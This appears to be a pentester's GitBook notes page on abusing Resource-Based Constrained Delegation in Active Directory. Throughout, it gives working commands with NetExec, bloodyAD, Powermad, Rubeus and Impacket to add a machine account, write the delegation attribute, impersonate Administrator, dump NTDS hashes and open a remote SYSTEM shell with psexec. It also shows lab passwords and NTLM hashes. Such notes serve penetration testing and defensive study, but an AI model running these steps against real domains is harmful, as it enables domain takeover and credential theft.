---
description: >-
  Instead of the domain admin configuring who can delegate, the target computer
  controls who is allowed to impersonate users to it.
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/kerberos-attack/resource-based-constrained-delegation
---

# Resource Based Constrained Delegation (RBCD)

**The Attribute That Makes It Work**

Every computer object has an attribute called:

```
msDS-AllowedToActOnBehalfOfOtherIdentity
```

This is just a list that says:

> _"I (the target computer) trust these accounts to impersonate anyone to me"_

If you can **write to this attribute** on a computer object → you can abuse RBCD.

**The Attack Flow**

```bash
You have WriteProperty on VICTIM-PC$
         ↓
Create a fake computer account (ATTACKER-PC$)
         ↓
Write ATTACKER-PC$ into VICTIM-PC$'s msDS-AllowedToActOnBehalfOf...
         ↓
Use S4U2Self + S4U2Proxy to get a ticket
impersonating Administrator → VICTIM-PC$
         ↓
PSExec / WinRM in as Administrator 🎉
```

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Terence.white have WriteAccountRestrictions

Using WriteAccountRestrictions, attackers configure Resource-Based Constrained Delegation (RBCD) on the RODC system, enabling impersonation of privileged users such as Administrator.

#### RBCD Privesc

We check MachineAccountQuota

{% code overflow="wrap" %}
```bash
nxc ldap 192.168.178.187 -u 'alex.turner' -p 'alex1988' -M maq
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

We check for pre-Windows 2000 accounts

{% code overflow="wrap" %}
```bash
nxc ldap 192.168.178.187 -u 'alex.turner' -p 'alex1988' -M pre2k
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

We configure RBCD on the domain controller

{% code overflow="wrap" %}
```bash
bloodyAD --host 192.168.178.187 -d grandstay.local -u 'terence.white' -p :e4a22d8e7bbec871b341c88c2e94cba2  add rbcd 'DC01$' 'RECEPTION$'
```
{% endcode %}

We impersonate Administrator via Kerberos delegation

{% code overflow="wrap" %}
```bash
getST.py -spn cifs/DC01.grandstay.local -impersonate Administrator -dc-ip 192.168.178.187 'grandstay.local/RECEPTION$:reception'
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
export KRB5CCNAME=Administrator@cifs_DC01.grandstay.local@GRANDSTAY.LOCAL.ccache
nxc smb 192.168.178.187 -k --use-kcache -u Administrator --ntds
```
{% endcode %}

## Abuse by Windows System

We can use this attack vector with <mark style="color:red;">**GenericAll**</mark>, <mark style="color:red;">**WriteProperty**</mark>, or <mark style="color:red;">**WriteDACL**</mark> access rights.

### Enumerating ms-DS-MachineAccountQuota

{% code title="PowerView" %}
```powershell
PS C:\> Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota 
```
{% endcode %}

### Creating computer account with Powermad

```powershell
PS C:\Tools> . .\powermad.ps1

PS C:\Tools> New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
[+] Machine account myComputer added
```

We can verify our new computer is present

```powershell
PS C:\> Get-DomainComputer -Identity myComputer
```

### Creating a new SecurityDescriptor

```powershell
PS C:\> $sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid

PS C:\> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))" 

PS C:\tools> $SDbytes = New-Object byte[] ($SD.BinaryLength)

PS C:\tools> $SD.GetBinaryForm($SDbytes,0)

PS C:\tools> Get-DomainComputer -Identity appsrv | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Verifying the SID in the SecurityDescriptor

```powershell
PS C:\> $RBCDbytes = Get-DomainComputer appsrv -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity

PS C:\> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0

PS C:\> $Descriptor.DiscretionaryAcl

BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-434106389-3621871093-548134407-3601
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None

PS C:\> ConvertFrom-SID S-1-5-21-434106389-3621871093-548134407-3601
Vulnableone\myComputer$
```

### Using S4U extension to request a TGS for appsrv

```powershell
PS C:\Tools> .\Rubeus.exe s4u /user:myComputer$ /rc4:A36EAFB522589934A6E5CE92C6434223 /impersonateuser:administrator /msdsspn:CIFS/appsrv.vulnableone.local /ptt         
```

Now that we have a **TGS** for the **CIFS** service on **appsrv** as _**administrator.**_

```powershell
PS C:\Tools> dir \\appsrv.vulnableone.local\c$                                                                                                                           

    Directory: \\appsrv.vulnableone.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/20/2024   4:32 AM                inetpub
d-----        3/16/2014   6:23 AM                PerfLogs
d-r---        3/20/2024   4:27 AM                Program Files
d-----        3/16/2014   6:23 AM                Program Files (x86)
d-----        3/18/2024   5:16 AM                Tools
d-r---        3/20/2024   5:41 AM                Users
d-----        3/20/2024   4:32 AM                Windows
```

## Abuse by Linux System

### Adding Computer

{% code overflow="wrap" %}
```python
bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_name $computer_password
# or 
└─$ impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'Password123' vulnableone.local/khan.chanthou -hashes :142f15864b0dfdee9f742616ea1eb773
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account myComputer$ with password Password123.
```
{% endcode %}

### Adding delegation permissions to AppSRV

{% code overflow="wrap" %}
```python
bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
# or
└─$ impacket-rbcd -action write -delegate-to "AppSRV$" -delegate-from "myComputer$" vulnableone.local/khan.chanthou -hashes :142f15864b0dfdee9f742616ea1eb773
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] myComputer$ can now impersonate users on AppSRV$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     myComputer$   (S-1-5-21-434106389-3621871093-548134407-20101)

```
{% endcode %}

### Impersonating the Domain administrator

{% code overflow="wrap" %}
```python
└─$ impacket-getST -spn cifs/appsrv.vulnableone.local -impersonate administrator 'vulnableone.local/myComputer$:Passworod123'
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```
{% endcode %}

```bash
└─$ export KRB5CCNAME=administrator.ccache  

└─$ klist
Ticket cache: FILE:administrator.ccache
Default principal: administrator@vulnableone.local

Valid starting       Expires              Service principal
02/25/2024 20:44:29  02/26/2024 06:44:26  cifs/appsrv.vulnableone.local@vulnableone.local
        renew until 02/26/2024 20:44:26
```

### Remote Code Execution

```bash
└─$ impacket-psexec administrator@appsrv.vulnableone.local -k -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on appsrv.vulnableone.local.....
[*] Found writable share ADMIN$
[*] Uploading file QlwvUzZs.exe
[*] Opening SVCManager on appsrv.vulnableone.local.....
[*] Creating service plgE on appsrv.vulnableone.local.....
[*] Starting service plgE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1726]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
APPSRV
```
